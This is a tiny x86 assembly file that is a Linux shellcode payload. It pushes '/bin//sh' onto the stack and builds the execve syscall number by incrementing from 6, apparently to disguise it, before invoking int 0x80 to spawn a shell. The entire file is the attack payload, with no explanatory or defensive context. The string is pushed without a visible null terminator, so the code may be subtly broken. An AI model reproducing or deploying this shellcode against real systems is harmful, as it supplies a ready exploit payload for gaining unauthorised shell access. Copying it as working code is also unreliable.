BITS 32

	xor eax, eax
	
	push "//sh"
	push "/bin"

	xor edx, edx
	xor ecx, ecx
	mov ebx, esp

	push 6
	pop eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	
	
	int 0x80
